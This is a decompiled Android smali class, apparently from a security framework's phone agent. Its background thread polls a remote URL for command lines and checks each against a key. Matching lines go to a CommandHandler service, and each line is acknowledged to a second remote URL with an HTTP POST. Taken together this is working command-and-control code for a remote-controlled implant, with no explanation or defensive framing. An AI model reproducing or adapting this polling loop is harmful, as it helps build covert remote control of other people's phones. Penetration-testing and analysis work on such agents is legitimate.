.class Lcom/bulbsecurity/framework/app/InternetPoll$1;
.super Ljava/lang/Thread;
.source "InternetPoll.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bulbsecurity/framework/app/InternetPoll;->onStart(Landroid/content/Intent;I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bulbsecurity/framework/app/InternetPoll;

.field final synthetic val$key:Ljava/lang/String;

.field final synthetic val$postto:Ljava/lang/String;

.field final synthetic val$pullfrom:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/bulbsecurity/framework/app/InternetPoll;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bulbsecurity/framework/app/InternetPoll;

    .prologue
    .line 62
    iput-object p1, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->this$0:Lcom/bulbsecurity/framework/app/InternetPoll;

    iput-object p2, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$pullfrom:Ljava/lang/String;

    iput-object p3, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$key:Ljava/lang/String;

    iput-object p4, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$postto:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 14

    .prologue
    .line 64
    const/4 v10, 0x0

    .line 67
    .local v10, "url":Ljava/net/URL;
    :try_start_0
    new-instance v11, Ljava/net/URL;

    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$pullfrom:Ljava/lang/String;

    invoke-direct {v11, v12}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 68
    .end local v10    # "url":Ljava/net/URL;
    .local v11, "url":Ljava/net/URL;
    :try_start_1
    new-instance v6, Ljava/io/BufferedReader;

    new-instance v12, Ljava/io/InputStreamReader;

    invoke-virtual {v11}, Ljava/net/URL;->openStream()Ljava/io/InputStream;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v6, v12}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 69
    .local v6, "in":Ljava/io/BufferedReader;
    if-eqz v6, :cond_2

    .line 71
    const-string v12, "AAA"

    const-string v13, "Stream opened"

    invoke-static {v12, v13}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 73
    :goto_0
    invoke-virtual {v6}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v7

    .local v7, "inputLine":Ljava/lang/String;
    if-eqz v7, :cond_1

    .line 74
    const-string v12, "AAA"

    invoke-static {v12, v7}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 75
    const-string v12, " "

    invoke-virtual {v7, v12}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 76
    .local v0, "aString":[Ljava/lang/String;
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v12

    const/4 v13, 0x7

    if-lt v12, v13, :cond_0

    .line 78
    const/4 v12, 0x0

    aget-object v1, v0, v12

    .line 79
    .local v1, "checkkey":Ljava/lang/String;
    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$key:Ljava/lang/String;

    invoke-virtual {v1, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    if-eqz v12, :cond_0

    .line 81
    new-instance v8, Landroid/content/Intent;

    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->this$0:Lcom/bulbsecurity/framework/app/InternetPoll;

    invoke-virtual {v12}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplicationContext()Landroid/content/Context;

    move-result-object v12

    const-class v13, Lcom/bulbsecurity/framework/app/CommandHandler;

    invoke-direct {v8, v12, v13}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 82
    .local v8, "intent2":Landroid/content/Intent;
    const-string v12, "message"

    invoke-virtual {v8, v12, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 83
    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->this$0:Lcom/bulbsecurity/framework/app/InternetPoll;

    invoke-virtual {v12}, Lcom/bulbsecurity/framework/app/InternetPoll;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    .line 84
    .local v2, "context":Landroid/content/Context;
    invoke-virtual {v2, v8}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 90
    .end local v1    # "checkkey":Ljava/lang/String;
    .end local v2    # "context":Landroid/content/Context;
    .end local v8    # "intent2":Landroid/content/Intent;
    :cond_0
    new-instance v9, Ljava/util/ArrayList;

    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    .line 91
    .local v9, "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    new-instance v12, Lorg/apache/http/message/BasicNameValuePair;

    const-string v13, "deleteline"

    invoke-direct {v12, v13, v7}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v12}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 93
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 95
    .local v4, "httpclient":Lorg/apache/http/client/HttpClient;
    new-instance v5, Lorg/apache/http/client/methods/HttpPost;

    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->val$postto:Ljava/lang/String;

    invoke-direct {v5, v12}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    .line 96
    .local v5, "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v12, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    invoke-direct {v12, v9}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    invoke-virtual {v5, v12}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    .line 97
    invoke-interface {v4, v5}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 108
    .end local v0    # "aString":[Ljava/lang/String;
    .end local v4    # "httpclient":Lorg/apache/http/client/HttpClient;
    .end local v5    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v6    # "in":Ljava/io/BufferedReader;
    .end local v7    # "inputLine":Ljava/lang/String;
    .end local v9    # "nameValuePairs":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lorg/apache/http/NameValuePair;>;"
    :catch_0
    move-exception v3

    move-object v10, v11

    .line 110
    .end local v11    # "url":Ljava/net/URL;
    .local v3, "e":Ljava/lang/Exception;
    .restart local v10    # "url":Ljava/net/URL;
    :goto_1
    invoke-virtual {v3}, Ljava/lang/Exception;->printStackTrace()V

    .line 111
    .end local v3    # "e":Ljava/lang/Exception;
    :goto_2
    return-void

    .line 101
    .end local v10    # "url":Ljava/net/URL;
    .restart local v6    # "in":Ljava/io/BufferedReader;
    .restart local v7    # "inputLine":Ljava/lang/String;
    .restart local v11    # "url":Ljava/net/URL;
    :cond_1
    :try_start_2
    invoke-virtual {v6}, Ljava/io/BufferedReader;->close()V

    .line 102
    iget-object v12, p0, Lcom/bulbsecurity/framework/app/InternetPoll$1;->this$0:Lcom/bulbsecurity/framework/app/InternetPoll;

    invoke-virtual {v12}, Lcom/bulbsecurity/framework/app/InternetPoll;->stopSelf()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .end local v7    # "inputLine":Ljava/lang/String;
    :cond_2
    move-object v10, v11

    .line 111
    .end local v11    # "url":Ljava/net/URL;
    .restart local v10    # "url":Ljava/net/URL;
    goto :goto_2

    .line 108
    .end local v6    # "in":Ljava/io/BufferedReader;
    :catch_1
    move-exception v3

    goto :goto_1
.end method
